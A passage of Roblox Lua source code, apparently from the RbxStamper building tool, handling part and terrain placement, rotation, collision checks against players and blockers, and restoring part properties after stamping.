						local myBreakingFaces = ""
						if modelInfo and modelInfo.Parent:FindFirstChild("UnstampableFaces") then breakingFaces = modelInfo.Parent.UnstampableFaces.Value end
						if myModelInfo then myBreakingFaces = myModelInfo.Value end
						local hitFace = 0
		
						if modelInfo then hitFace = modelTargetSurface(modelInfo.Parent, game:GetService("Workspace").CurrentCamera.CoordinateFrame.p, Mouse.Hit.p) end
		
						-- are we stamping TO an unstampable surface?
						for bf in string.gmatch(breakingFaces, "[^,]+") do
							if hitFace == tonumber(bf) then
								-- return before we hit the JointsService code below!
								unstampableSurface = true
								game:GetService("JointsService"):ClearJoinAfterMoveJoints() -- clear the JointsService cache
								return
							end
						end
		
						-- now we have to cast the ray back in the other direction to find the surface we're stamping FROM
						hitFace = modelTargetSurface(stampData.CurrentParts, Mouse.Hit.p, game:GetService("Workspace").CurrentCamera.CoordinateFrame.p)
		
						-- are we stamping WITH an unstampable surface?
						for bf in string.gmatch(myBreakingFaces, "[^,]+") do
							if hitFace == tonumber(bf) then
								unstampableSurface = true
								game:GetService("JointsService"):ClearJoinAfterMoveJoints() -- clear the JointsService cache
								return
							end
						end
		
						-- just need to match breakingFace against targetSurface using rotation supplied by modelCFrame
						-- targetSurface: 1 is top, 4 is bottom,
					end
				end
		
				-- to show joints during the mouse move
				unstampableSurface = false
				game:GetService("JointsService"):SetJoinAfterMoveInstance(stampData.CurrentParts)
		
				-- most common mouse inactive error occurs here, so check mouse active one more time in a pcall
				if not pcall(function()
						if Mouse and Mouse.Target and Mouse.Target.Parent:FindFirstChild("RobloxModel") == nil then
							return
						else
							return
						end
					end)
				then
					error("Error: RbxStamper.DoStamperMouseMove Mouse is nil on second check")
					game:GetService("JointsService"):ClearJoinAfterMoveJoints()
					Mouse = nil
					return
				end
		
				if Mouse and Mouse.Target and Mouse.Target.Parent:FindFirstChild("RobloxModel") == nil then
					game:GetService("JointsService"):SetJoinAfterMoveTarget(Mouse.Target)
				else
					game:GetService("JointsService"):SetJoinAfterMoveTarget(nil)
				end
				game:GetService("JointsService"):ShowPermissibleJoints()
		
				-- here we allow for a line of high-scalability parts
				if isMegaClusterPart() and HighScalabilityLine and HighScalabilityLine.Start then
						DoHighScalabilityRegionSelect()
				end
			end
		
			local function setupKeyListener(key, Mouse)
				if control and control["Paused"] then return end -- don't do this if we have no stamp
		
				key = string.lower(key)
				if key == 'r' and not autoAlignToFace(stampData.CurrentParts) then -- rotate the model
					gInitial90DegreeRotations = gInitial90DegreeRotations + 1
		
					-- Update orientation value if this is a fake terrain part
					local clusterValues = stampData.CurrentParts:FindFirstChild("ClusterMaterial", true)
					if clusterValues and clusterValues:IsA("Vector3Value") then
						clusterValues.Value = Vector3.new(clusterValues.Value.X, clusterValues.Value.Y, (clusterValues.Value.Z + 1) % 4)
					end
		
					-- Rotate the parts or all the parts in the model
					local ry = math.pi/2
					if stampData.CurrentParts:IsA("Model") or stampData.CurrentParts:IsA("Tool") then
						--stampData.CurrentParts:Rotate(0, ry, 0)
						modelRotate(stampData.CurrentParts, ry)
					else
						stampData.CurrentParts.CFrame = CFrame.fromEulerAnglesXYZ(0, ry, 0) * stampData.CurrentParts.CFrame
					end
		
					-- After rotating, update the position
					configFound, targetCFrame = findConfigAtMouseTarget(Mouse, stampData)
					if configFound then
						positionPartsAtCFrame3(targetCFrame, stampData.CurrentParts)
		
						-- update everything else in MouseMove
						DoStamperMouseMove(Mouse)
					end
				elseif key == 'c' then -- try to expand our high scalability dragger dimension
					if HighScalabilityLine.InternalLine and HighScalabilityLine.InternalLine.magnitude > 0 and HighScalabilityLine.Dimensions < 3 then
						HighScalabilityLine.MorePoints[HighScalabilityLine.Dimensions] = HighScalabilityLine.End
						HighScalabilityLine.MoreLines[HighScalabilityLine.Dimensions] = HighScalabilityLine.InternalLine
						HighScalabilityLine.Dimensions = HighScalabilityLine.Dimensions + 1
						HighScalabilityLine.NewHint = true
					end
				end
			end
		
			keyCon = Mouse.KeyDown:connect(function(key) -- init key connection (keeping code close to func)
				setupKeyListener(key, Mouse)
			end)
		
			local function resetHighScalabilityLine()
				if HighScalabilityLine then
					HighScalabilityLine.Start = nil
					HighScalabilityLine.End = nil
					HighScalabilityLine.InternalLine = nil
					HighScalabilityLine.NewHint = true
				end
			end
		
			local function flashRedBox()
				local gui = game:GetService("CoreGui")
				if game:GetService("Players") then
					if game:GetService("Players")["LocalPlayer"] then
						if game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui") then
							gui = game:GetService("Players").LocalPlayer.PlayerGui
						end
					end
				end
				if not stampData["ErrorBox"] then return end
		
				stampData.ErrorBox.Parent = gui
				if stampData.CurrentParts:IsA("Tool") then
					stampData.ErrorBox.Adornee = stampData.CurrentParts.Handle
				else
					stampData.ErrorBox.Adornee = stampData.CurrentParts
				end
		
				delay(0,function()
					for i = 1, 3 do
						if stampData["ErrorBox"] then stampData.ErrorBox.Visible = true end
						wait(0.13)
						if stampData["ErrorBox"] then stampData.ErrorBox.Visible = false end
						wait(0.13)
					end
					if stampData["ErrorBox"] then
						stampData.ErrorBox.Adornee = nil
						stampData.ErrorBox.Parent = nil
					end
				end)
			end
		
			local function DoStamperMouseDown(Mouse)
				if not Mouse then
					error("Error: RbxStamper.DoStamperMouseDown: Mouse is nil")
					return
				end
				if not Mouse:IsA("Mouse") then
					error("Error: RbxStamper.DoStamperMouseDown: Mouse is of type", Mouse.className,"should be of type Mouse")
					return
				end
				if not stampData then
					return
				end
		
				if isMegaClusterPart() then
					if Mouse and HighScalabilityLine then
						local megaCube = stampData.CurrentParts:FindFirstChild("MegaClusterCube", true)
						local terrain = game:GetService("Workspace").Terrain
						if megaCube then
							HighScalabilityLine.Dimensions = 1
							local tempCell = terrain:WorldToCell(megaCube.CFrame.p)
							HighScalabilityLine.Start = terrain:CellCenterToWorld(tempCell.X, tempCell.Y, tempCell.Z)
							return
						else
							HighScalabilityLine.Dimensions = 1
							local tempCell = terrain:WorldToCell(stampData.CurrentParts.CFrame.p)
							HighScalabilityLine.Start = terrain:CellCenterToWorld(tempCell.X, tempCell.Y, tempCell.Z)
							return
						end
					end
				end
			end
		
			local function loadSurfaceTypes(part, surfaces)
				part.TopSurface = surfaces[1]
				part.BottomSurface = surfaces[2]
				part.LeftSurface = surfaces[3]
				part.RightSurface = surfaces[4]
				part.FrontSurface = surfaces[5]
				part.BackSurface = surfaces[6]
			end
		
			local function saveSurfaceTypes(part, myTable)
				local tempTable = {}
				tempTable[1] = part.TopSurface
				tempTable[2] = part.BottomSurface
				tempTable[3] = part.LeftSurface
				tempTable[4] = part.RightSurface
				tempTable[5] = part.FrontSurface
				tempTable[6] = part.BackSurface
		
				myTable[part] = tempTable
			end
		
			local function makeSurfaceUnjoinable(part, surface)
				-- TODO: FILL OUT!
			end
		
			local function prepareModel(model)
				if not model then return nil end
		
				local gDesiredTrans = 0.7
				local gStaticTrans = 1
		
				local clone = model:Clone()
				local scripts = {}
				local parts = {}
				local decals = {}
		
				stampData = {}
				stampData.DisabledScripts = {}
				stampData.TransparencyTable = {}
				stampData.MaterialTable = {}
				stampData.CanCollideTable = {}
				stampData.AnchoredTable = {}
				stampData.ArchivableTable = {}
				stampData.DecalTransparencyTable = {}
				stampData.SurfaceTypeTable = {}
		
				collectParts(clone, parts, scripts, decals)
		
				if #parts <= 0 then return nil, "no parts found in modelToStamp" end
		
				for index,script in pairs(scripts) do
					if not(script.Disabled) then
						script.Disabled = true
						stampData.DisabledScripts[#stampData.DisabledScripts + 1] = script
					end
				end
				for index, part in pairs(parts) do
					stampData.TransparencyTable[part] = part.Transparency
					part.Transparency = gStaticTrans + (1 - gStaticTrans) * part.Transparency
					stampData.MaterialTable[part] = part.Material
					part.Material = Enum.Material.Plastic
					stampData.CanCollideTable[part] = part.CanCollide
					part.CanCollide = false
					stampData.AnchoredTable[part] = part.Anchored
					part.Anchored = true
					stampData.ArchivableTable[part] = part.Archivable
					part.Archivable = false
		
					saveSurfaceTypes(part, stampData.SurfaceTypeTable)
		
					local fadeInDelayTime = 0.5
					local transFadeInTime = 0.5
					delay(0,function()
						wait(fadeInDelayTime) -- give it some time to be completely transparent
		
						local begTime = tick()
						local currTime = begTime
						while (currTime - begTime) < transFadeInTime and part and part:IsA("BasePart") and part.Transparency > gDesiredTrans do
							local newTrans = 1 - (((currTime - begTime)/transFadeInTime) * (gStaticTrans - gDesiredTrans))
							if stampData["TransparencyTable"] and stampData.TransparencyTable[part] then
								part.Transparency = newTrans + (1 - newTrans) * stampData.TransparencyTable[part]
							end
							wait(0.03)
							currTime = tick()
						end
						if part and part:IsA("BasePart") then
							if stampData["TransparencyTable"] and stampData.TransparencyTable[part] then
								part.Transparency = gDesiredTrans + (1 - gDesiredTrans) * stampData.TransparencyTable[part]
							end
						end
					end)
				end
		
				for index, decal in pairs(decals) do
					stampData.DecalTransparencyTable[decal] = decal.Transparency
					decal.Transparency = gDesiredTrans + (1 - gDesiredTrans) * decal.Transparency
				end
		
				-- disable all seats
				setSeatEnabledStatus(clone, true)
				setSeatEnabledStatus(clone, false)
		
				stampData.CurrentParts = clone
		
				-- if auto-alignable, we enforce a pre-rotation to the canonical "0-frame"
				if autoAlignToFace(clone) then
					stampData.CurrentParts:ResetOrientationToIdentity()
					gInitial90DegreeRotations = 0
				else -- pre-rotate if necessary
					local ry = gInitial90DegreeRotations * math.pi/2
					if stampData.CurrentParts:IsA("Model") or stampData.CurrentParts:IsA("Tool") then
						--stampData.CurrentParts:Rotate(0, ry, 0)
						modelRotate(stampData.CurrentParts, ry)
					else
						stampData.CurrentParts.CFrame = CFrame.fromEulerAnglesXYZ(0, ry, 0) * stampData.CurrentParts.CFrame
					end
				end
		
				-- since we're cloning the old model instead of the new one, we will need to update the orientation based on the original value AND how many more
				--  rotations we expect since then [either that or we need to store the just-stamped clusterMaterial.Value.Z somewhere].  This should fix the terrain rotation
				--  issue (fingers crossed) [HotThoth]
		
				local clusterMaterial = stampData.CurrentParts:FindFirstChild("ClusterMaterial", true)
				if clusterMaterial and clusterMaterial:IsA("Vector3Value") then
					clusterMaterial.Value = Vector3.new(clusterMaterial.Value.X, clusterMaterial.Value.Y, (clusterMaterial.Value.Z + gInitial90DegreeRotations) % 4)
				end
		
				-- After rotating, update the position
				local configFound, targetCFrame = findConfigAtMouseTarget(Mouse, stampData)
				if configFound then
					stampData.CurrentParts = positionPartsAtCFrame3(targetCFrame, stampData.CurrentParts)
				end
		
				-- to show joints during the mouse move
				game:GetService("JointsService"):SetJoinAfterMoveInstance(stampData.CurrentParts)
		
				return clone, parts
			end
		
			local function checkTerrainBlockCollisions(cellPos, checkHighScalabilityStamp)
				local cellCenterToWorld = game:GetService("Workspace").Terrain.CellCenterToWorld
				local cellCenter = cellCenterToWorld(game:GetService("Workspace").Terrain, cellPos.X, cellPos.Y, cellPos.Z)
				local cellBlockingParts = game:GetService("Workspace"):FindPartsInRegion3(Region3.new(cellCenter - Vector3.new(2, 2, 2) + insertBoundingBoxOverlapVector, cellCenter + Vector3.new(2, 2, 2) - insertBoundingBoxOverlapVector), stampData.CurrentParts,	100)
		
				local skipThisCell = false
		
				for b = 1, #cellBlockingParts do
					if isBlocker(cellBlockingParts[b]) then skipThisCell = true break end
				end
		
				if not skipThisCell then
					-- pop players up above any set cells
					local alreadyPushedUp = {}
					-- if no blocking model below, then see if stamping on top of a character
					for b = 1, #cellBlockingParts do
						if	cellBlockingParts[b].Parent and
							not alreadyPushedUp[cellBlockingParts[b].Parent] and
							cellBlockingParts[b].Parent:FindFirstChild("Humanoid") and
							cellBlockingParts[b].Parent:FindFirstChild("Humanoid"):IsA("Humanoid") then
						-----------------------------------------------------------------------------------
								local blockingPersonTorso = cellBlockingParts[b].Parent:FindFirstChild("Torso")
								alreadyPushedUp[cellBlockingParts[b].Parent] = true
		
								if blockingPersonTorso then
									-- if so, let's push the person upwards so they pop on top of the stamped model/part (but only if there's space above them)
									local newY = cellCenter.Y + 5
									if spaceAboveCharacter(blockingPersonTorso, newY, stampData) then
										blockingPersonTorso.CFrame = blockingPersonTorso.CFrame + Vector3.new(0, newY - blockingPersonTorso.CFrame.p.Y, 0)
									else
										-- if no space, we just skip this one
										skipThisCell = true
										break
									end
								end
						-----------------------------------------------------------------------------------
						end
					end
				end
		
				if not skipThisCell then  -- if we STILL aren't skipping...  then we're good to go!
					local canSetCell = true
		
					if checkHighScalabilityStamp then -- check to see if cell is in region, if not we'll skip set
						if allowedStampRegion then
							local cellPos = cellCenterToWorld(game:GetService("Workspace").Terrain, cellPos.X, cellPos.Y, cellPos.Z)
							if cellPos.X + 2 > allowedStampRegion.CFrame.p.X + allowedStampRegion.Size.X/2 then
								canSetCell = false
							elseif cellPos.X - 2 < allowedStampRegion.CFrame.p.X - allowedStampRegion.Size.X/2 then
								canSetCell = false
							elseif cellPos.Y + 2 > allowedStampRegion.CFrame.p.Y + allowedStampRegion.Size.Y/2 then
								canSetCell = false
							elseif cellPos.Y - 2 < allowedStampRegion.CFrame.p.Y - allowedStampRegion.Size.Y/2 then
								canSetCell = false
							elseif cellPos.Z + 2 > allowedStampRegion.CFrame.p.Z + allowedStampRegion.Size.Z/2 then
								canSetCell = false
							elseif cellPos.Z - 2 < allowedStampRegion.CFrame.p.Z - allowedStampRegion.Size.Z/2 then
								canSetCell = false
							end
						end
					end
		
					return canSetCell
				end
				return false
			end
		
		
			local function ResolveMegaClusterStamp(checkHighScalabilityStamp)
				local cellSet = false
		
				local cluser = game:GetService("Workspace").Terrain
		
				local line = HighScalabilityLine.InternalLine
				local cMax = game:GetService("Workspace").Terrain.MaxExtents.Max
				local cMin = game:GetService("Workspace").Terrain.MaxExtents.Min
		
				local clusterMaterial = 1 -- default is grass
				local clusterType = 0 -- default is brick
				local clusterOrientation = 0 -- default is 0 rotation
		
				local autoWedgeClusterParts = false
				if stampData.CurrentParts:FindFirstChild("AutoWedge") then autoWedgeClusterParts = true end
		
				if stampData.CurrentParts:FindFirstChild("ClusterMaterial", true) then
					clusterMaterial = stampData.CurrentParts:FindFirstChild("ClusterMaterial", true)
					if clusterMaterial:IsA("Vector3Value") then
						clusterType = clusterMaterial.Value.Y
						clusterOrientation = clusterMaterial.Value.Z
						clusterMaterial = clusterMaterial.Value.X
					elseif clusterMaterial:IsA("IntValue") then
						clusterMaterial = clusterMaterial.Value
					end
				end
		
				if HighScalabilityLine.Adorn.Parent and HighScalabilityLine.Start and ((HighScalabilityLine.Dimensions > 1) or (line and line.magnitude > 0)) then
					local startCell = game:GetService("Workspace").Terrain:WorldToCell(HighScalabilityLine.Start)
					local xInc = {0,0,0}
					local yInc = {0,0,0}
					local zInc = {0,0,0}
		
					local cluster = game:GetService("Workspace").Terrain
		
					local incrementVect = {nil, nil, nil}
					local stepVect = {Vector3.new(0, 0, 0), Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)}
		
					local worldAxes = {Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1)}
		
					local lines = {}
					if HighScalabilityLine.Dimensions > 1 then table.insert(lines, HighScalabilityLine.MoreLines[1]) end
					if line and line.magnitude > 0 then table.insert(lines, line) end
					if HighScalabilityLine.Dimensions > 2 then table.insert(lines, HighScalabilityLine.MoreLines[2]) end
		
					for i = 1, #lines do
						lines[i] = Vector3.new(math.floor(lines[i].X+.5), math.floor(lines[i].Y+.5), math.floor(lines[i].Z+.5)) -- round to integers
		
						if lines[i].X > 0 then xInc[i] = 1 elseif lines[i].X < 0 then xInc[i] = -1 end
						if lines[i].Y > 0 then yInc[i] = 1 elseif lines[i].Y < 0 then yInc[i] = -1 end
						if lines[i].Z > 0 then zInc[i] = 1 elseif lines[i].Z < 0 then zInc[i] = -1 end
		
						incrementVect[i] = Vector3.new(xInc[i], yInc[i], zInc[i])
						if incrementVect[i].magnitude < .9 then incrementVect[i] = nil end
					end
		
		
					if not lines[2] then lines[2] = Vector3.new(0, 0, 0) end
					if not lines[3] then lines[3] = Vector3.new(0, 0, 0) end
		
					local waterForceTag = stampData.CurrentParts:FindFirstChild("WaterForceTag", true)
					local waterForceDirectionTag = stampData.CurrentParts:FindFirstChild("WaterForceDirectionTag", true)
		
					while (stepVect[3].magnitude*4 <= lines[3].magnitude) do
						local outerStepVectIndex = 1
						while outerStepVectIndex < 4 do
							stepVect[2] = Vector3.new(0, 0, 0)
							while (stepVect[2].magnitude*4 <= lines[2].magnitude) do
								local innerStepVectIndex = 1
								while innerStepVectIndex < 4 do
									stepVect[1] = Vector3.new(0, 0, 0)
									while (stepVect[1].magnitude*4 <= lines[1].magnitude) do
										local stepVectSum = stepVect[1] + stepVect[2] + stepVect[3]
										local cellPos = Vector3int16.new(startCell.X + stepVectSum.X, startCell.Y + stepVectSum.Y, startCell.Z + stepVectSum.Z)
										if cellPos.X >= cMin.X and cellPos.Y >= cMin.Y and cellPos.Z >= cMin.Z and cellPos.X < cMax.X and cellPos.Y < cMax.Y and cellPos.Z < cMax.Z then
											-- check if overlaps player or part
											local okToStampTerrainBlock = checkTerrainBlockCollisions(cellPos, checkHighScalabilityStamp)
		
											if okToStampTerrainBlock then
												if waterForceTag then
													cluster:SetWaterCell(cellPos.X, cellPos.Y, cellPos.Z, Enum.WaterForce[waterForceTag.Value], Enum.WaterDirection[waterForceDirectionTag.Value])
												else
													cluster:SetCell(cellPos.X, cellPos.Y, cellPos.Z, clusterMaterial, clusterType, clusterOrientation)
												end
												cellSet = true
		
												-- auto-wedge it?
												if (autoWedgeClusterParts) then
													game:GetService("Workspace").Terrain:AutowedgeCells(Region3int16.new(Vector3int16.new(cellPos.x - 1, cellPos.y - 1, cellPos.z - 1),
														Vector3int16.new(cellPos.x + 1, cellPos.y + 1, cellPos.z + 1)))
												end
											end
										end
										stepVect[1] = stepVect[1] + incrementVect[1]
									end
									if incrementVect[2] then
										while innerStepVectIndex < 4 and worldAxes[innerStepVectIndex]:Dot(incrementVect[2]) == 0 do
											innerStepVectIndex = innerStepVectIndex + 1
										end
										if innerStepVectIndex < 4 then
											stepVect[2] = stepVect[2] + worldAxes[innerStepVectIndex] * worldAxes[innerStepVectIndex]:Dot(incrementVect[2])
										end
										innerStepVectIndex = innerStepVectIndex + 1
									else
										stepVect[2] = Vector3.new(1, 0, 0)
										innerStepVectIndex = 4 -- skip all remaining loops
									end
									if (stepVect[2].magnitude*4 > lines[2].magnitude) then innerStepVectIndex = 4 end
								end
							end
							if incrementVect[3] then
								while outerStepVectIndex < 4 and worldAxes[outerStepVectIndex]:Dot(incrementVect[3]) == 0 do
									outerStepVectIndex = outerStepVectIndex + 1
								end
								if outerStepVectIndex < 4 then
									stepVect[3] = stepVect[3] + worldAxes[outerStepVectIndex] * worldAxes[outerStepVectIndex]:Dot(incrementVect[3])
								end
								outerStepVectIndex = outerStepVectIndex + 1
							else -- skip all remaining loops
								stepVect[3] = Vector3.new(1, 0, 0) outerStepVectIndex = 4
							end
							if (stepVect[3].magnitude*4 > lines[3].magnitude) then outerStepVectIndex = 4 end
						end
					end
				end
		
				-- and also get rid of any HighScalabilityLine stuff if it's there
				HighScalabilityLine.Start = nil
				HighScalabilityLine.Adorn.Parent = nil
		
				-- Mark for undo.
				if cellSet then
					stampData.CurrentParts.Parent = nil
					pcall(function() game:GetService("ChangeHistoryService"): SetWaypoint("StamperMulti") end)
				end
		
				return cellSet
			end
		
			local function DoStamperMouseUp(Mouse)
				if not Mouse then
					error("Error: RbxStamper.DoStamperMouseUp: Mouse is nil")
					return false
				end
				if not Mouse:IsA("Mouse") then
					error("Error: RbxStamper.DoStamperMouseUp: Mouse is of type", Mouse.className,"should be of type Mouse")
					return false
				end
		
				if not stampData.Dragger then
					error("Error: RbxStamper.DoStamperMouseUp: stampData.Dragger is nil")
					return false
				end
		
				if not HighScalabilityLine then
					return false
				end
		
				local checkHighScalabilityStamp = nil
				if stampInModel then
					local canStamp = nil
					local isHSLPart = isMegaClusterPart()
		
					if isHSLPart and
						HighScalabilityLine and
						HighScalabilityLine.Start and
						HighScalabilityLine.InternalLine and
						HighScalabilityLine.InternalLine.magnitude > 0 then -- we have an HSL line, test later
							canStamp = true
							checkHighScalabilityStamp = true
					else
						canStamp, checkHighScalabilityStamp = t.CanEditRegion(stampData.CurrentParts, allowedStampRegion)
					end
		
					if not canStamp then
						if stampFailedFunc then
							stampFailedFunc()
						end
						return false
					end
				end
		
				-- if unstampable face, then don't let us stamp there!
				if unstampableSurface then
					flashRedBox()
					return false
				end
		
				-- recheck if we can stamp, as we just moved part
				local canStamp, checkHighScalabilityStamp = t.CanEditRegion(stampData.CurrentParts, allowedStampRegion)
				if not canStamp then
					if stampFailedFunc then
						stampFailedFunc()
					end
					return false
				end
		
				-- Prevent part from being stamped on top of a player
		
				local minBB, maxBB = getBoundingBoxInWorldCoordinates(stampData.CurrentParts)
		
				-- HotThoth's note:  Now that above CurrentParts positioning has been commented out, to be truly correct, we would need to use the
				--                     value of configFound from the previous onStamperMouseMove call which moved the CurrentParts
				--                     Shouldn't this be true when lastTargetCFrame has been set and false otherwise?
				configFound, targetCFrame = findConfigAtMouseTarget(Mouse, stampData)
		
				if configFound and not HighScalabilityLine.Adorn.Parent then
					if clusterPartsInRegion(minBB + insertBoundingBoxOverlapVector, maxBB - insertBoundingBoxOverlapVector) then
						flashRedBox()
						return false
					end
		
					local blockingParts = game:GetService("Workspace"):FindPartsInRegion3(Region3.new(minBB + insertBoundingBoxOverlapVector,
																			maxBB - insertBoundingBoxOverlapVector),
																			stampData.CurrentParts,
																			100)
		
		
					for b = 1, #blockingParts do
						if isBlocker(blockingParts[b]) then
							flashRedBox()
							return false
						end
					end
		
					local alreadyPushedUp = {}
						-- if no blocking model below, then see if stamping on top of a character
						for b = 1, #blockingParts do
							if	blockingParts[b].Parent and
								not alreadyPushedUp[blockingParts[b].Parent] and
								blockingParts[b].Parent:FindFirstChild("Humanoid") and
								blockingParts[b].Parent:FindFirstChild("Humanoid"):IsA("Humanoid") then
							---------------------------------------------------------------------------
									local blockingPersonTorso = blockingParts[b].Parent:FindFirstChild("Torso")
									alreadyPushedUp[blockingParts[b].Parent] = true
		
									if blockingPersonTorso then
										-- if so, let's push the person upwards so they pop on top of the stamped model/part (but only if there's space above them)
										local newY = maxBB.Y + 3
										if spaceAboveCharacter(blockingPersonTorso, newY, stampData) then
											blockingPersonTorso.CFrame = blockingPersonTorso.CFrame + Vector3.new(0, newY - blockingPersonTorso.CFrame.p.Y, 0)
										else
											-- if no space, we just error
											flashRedBox()
											return false
										end
									end
							---------------------------------------------------------------------------
							end
						end
		
				elseif (not configFound) and not (HighScalabilityLine.Start and HighScalabilityLine.Adorn.Parent) then -- if no config then only stamp if it's a real HSL!
					resetHighScalabilityLine()
					return false
				end
		
				-- something will be stamped!  so set the "StampedSomething" toggle to true
				if game:GetService("Players")["LocalPlayer"] then
					if game:GetService("Players").LocalPlayer["Character"] then
						local localChar = game:GetService("Players").LocalPlayer.Character
						local stampTracker = localChar:FindFirstChild("StampTracker")
						if stampTracker and not stampTracker.Value then
							stampTracker.Value = true
						end
					end
				end
		
				-- if we drew a line of mega parts, stamp them out
				if HighScalabilityLine.Start and HighScalabilityLine.Adorn.Parent and isMegaClusterPart() then
					if ResolveMegaClusterStamp(checkHighScalabilityStamp) or checkHighScalabilityStamp then
						-- kill the ghost part
						stampData.CurrentParts.Parent = nil
						return true
					end
				end
		
				-- not High-Scalability-Line-Based, so behave normally [and get rid of any HSL stuff]
				HighScalabilityLine.Start = nil
				HighScalabilityLine.Adorn.Parent = nil
		
				local cluster = game:GetService("Workspace").Terrain
		
				-- if target point is in cluster, just use cluster:SetCell
				if isMegaClusterPart() then
					-- if targetCFrame is inside cluster, just set that cell to 1 and return
					--local cellPos = cluster:WorldToCell(targetCFrame.p)
		
					local cellPos
					if stampData.CurrentParts:IsA("Model") then cellPos = cluster:WorldToCell(stampData.CurrentParts:GetModelCFrame().p)
					else cellPos = cluster:WorldToCell(stampData.CurrentParts.CFrame.p) end
		
					local cMax = game:GetService("Workspace").Terrain.MaxExtents.Max
					local cMin = game:GetService("Workspace").Terrain.MaxExtents.Min
		
					if checkTerrainBlockCollisions(cellPos, false) then
		
						local clusterValues = stampData.CurrentParts:FindFirstChild("ClusterMaterial", true)
						local waterForceTag = stampData.CurrentParts:FindFirstChild("WaterForceTag", true)
						local waterForceDirectionTag = stampData.CurrentParts:FindFirstChild("WaterForceDirectionTag", true)
		
						if cellPos.X >= cMin.X and cellPos.Y >= cMin.Y and cellPos.Z >= cMin.Z and cellPos.X < cMax.X and cellPos.Y < cMax.Y and cellPos.Z < cMax.Z then
		
							if waterForceTag then
								cluster:SetWaterCell(cellPos.X, cellPos.Y, cellPos.Z, Enum.WaterForce[waterForceTag.Value], Enum.WaterDirection[waterForceDirectionTag.Value])
							elseif not clusterValues then
								cluster:SetCell(cellPos.X, cellPos.Y, cellPos.Z, cellInfo.Material, cellInfo.clusterType, gInitial90DegreeRotations % 4)
							elseif clusterValues:IsA("Vector3Value") then
								cluster:SetCell(cellPos.X, cellPos.Y, cellPos.Z, clusterValues.Value.X, clusterValues.Value.Y, clusterValues.Value.Z)
							else
								cluster:SetCell(cellPos.X, cellPos.Y, cellPos.Z, clusterValues.Value, 0, 0)
							end
		
							local autoWedgeClusterParts = false
							if stampData.CurrentParts:FindFirstChild("AutoWedge") then autoWedgeClusterParts = true end
		
							-- auto-wedge it
							if (autoWedgeClusterParts) then
								game:GetService("Workspace").Terrain:AutowedgeCells(
									Region3int16.new(
										Vector3int16.new(cellPos.x - 1, cellPos.y - 1, cellPos.z - 1),
										Vector3int16.new(cellPos.x + 1, cellPos.y + 1, cellPos.z + 1)
									)
								)
							end
		
							-- kill the ghost part
							stampData.CurrentParts.Parent = nil
		
							-- Mark for undo.  It has to happen here or the selection display will come back also.
							pcall(function() game:GetService("ChangeHistoryService"):SetWaypoint("StamperSingle") end)
							return true
						end
					else
						-- you tried to stamp a HSL-single part where one does not belong!
						flashRedBox()
						return false
					end
				end
		
				local function getPlayer()
					if game:GetService("Players")["LocalPlayer"] then
						return game:GetService("Players").LocalPlayer
					end
					return nil
				end
		
		
				-- Post process: after positioning the part or model, restore transparency, material, anchored and collide states and create joints
				if stampData.CurrentParts:IsA("Model") or stampData.CurrentParts:IsA("Tool") then
					if stampData.CurrentParts:IsA("Model") then
						-- Tyler's magical hack-code for allowing/preserving clones of both Surface and Manual Welds...  just don't ask X<
						local manualWeldTable = {}
						local manualWeldParentTable = {}
						saveTheWelds(stampData.CurrentParts, manualWeldTable, manualWeldParentTable)
						stampData.CurrentParts:BreakJoints()
						stampData.CurrentParts:MakeJoints()
						restoreTheWelds(manualWeldTable, manualWeldParentTable)
					end
		
					-- if it's a model, we also want to fill in the playerID and playerName tags, if it has those (e.g. for the friend-only door)
					local playerIdTag = stampData.CurrentParts:FindFirstChild("PlayerIdTag")
					local playerNameTag = stampData.CurrentParts:FindFirstChild("PlayerNameTag")
					if playerIdTag ~= nil then
						local tempPlayerValue = getPlayer()
						if tempPlayerValue ~= nil then playerIdTag.Value = tempPlayerValue.UserId end
					end
					if playerNameTag ~= nil then
						if game:GetService("Players")["LocalPlayer"] then
							local tempPlayerValue = game:GetService("Players").LocalPlayer
							if tempPlayerValue ~= nil then playerNameTag.Value = tempPlayerValue.Name end
						end
					end
					-- ...and tag all inserted models for subsequent origin identification
					-- if no RobloxModel tag already exists, then add it.
					if stampData.CurrentParts:FindFirstChild("RobloxModel") == nil then
						local stringTag = Instance.new("BoolValue", stampData.CurrentParts)
						stringTag.Name = "RobloxModel"
		
						if stampData.CurrentParts:FindFirstChild("RobloxStamper") == nil then
							local stringTag2 = Instance.new("BoolValue", stampData.CurrentParts)
							stringTag2.Name = "RobloxStamper"
						end
					end
		
				else
					stampData.CurrentParts:BreakJoints()
					if stampData.CurrentParts:FindFirstChild("RobloxStamper") == nil then
						local stringTag2 = Instance.new("BoolValue", stampData.CurrentParts)
						stringTag2.Name = "RobloxStamper"
					end
				end
		
				-- make sure all the joints are activated before restoring anchor states
				game:GetService("JointsService"):CreateJoinAfterMoveJoints()
		
				-- Restore the original properties for all parts being stamped
				for part, transparency in pairs(stampData.TransparencyTable) do
					part.Transparency = transparency
				end
				for part, archivable in pairs(stampData.ArchivableTable) do
					part.Archivable = archivable
				end
				for part, material in pairs(stampData.MaterialTable) do
					part.Material = material
				end
				for part, collide in pairs(stampData.CanCollideTable) do
					part.CanCollide = collide
				end
				for part, anchored in pairs(stampData.AnchoredTable) do
					part.Anchored = anchored
				end
				for decal, transparency in pairs(stampData.DecalTransparencyTable) do
					decal.Transparency = transparency
				end
		
				for part, surfaces in pairs(stampData.SurfaceTypeTable) do
					loadSurfaceTypes(part, surfaces)
				end
		
				if isMegaClusterPart() then
					stampData.CurrentParts.Transparency = 0
				end
		
				-- re-enable all seats
				setSeatEnabledStatus(stampData.CurrentParts, true)
		
				stampData.TransparencyTable = nil
				stampData.ArchivableTable = nil
				stampData.MaterialTable = nil
				stampData.CanCollideTable = nil
				stampData.AnchoredTable = nil
				stampData.SurfaceTypeTable = nil
		
				-- ...and tag all inserted models for subsequent origin identification
				-- if no RobloxModel tag already exists, then add it.
				if stampData.CurrentParts:FindFirstChild("RobloxModel") == nil then
					local stringTag = Instance.new("BoolValue", stampData.CurrentParts)
					stringTag.Name = "RobloxModel"
				end
		
				--Re-enable the scripts
				for index,script in pairs(stampData.DisabledScripts) do
					script.Disabled = false
				end
		
				--Now that they are all marked enabled, reinsert them into the world so they start running
				for index,script in pairs(stampData.DisabledScripts) do
					local oldParent = script.Parent
					script.Parent = nil
					script:Clone().Parent = oldParent
				end
		
				-- clear out more data
				stampData.DisabledScripts = nil
				stampData.Dragger = nil
				stampData.CurrentParts = nil
		
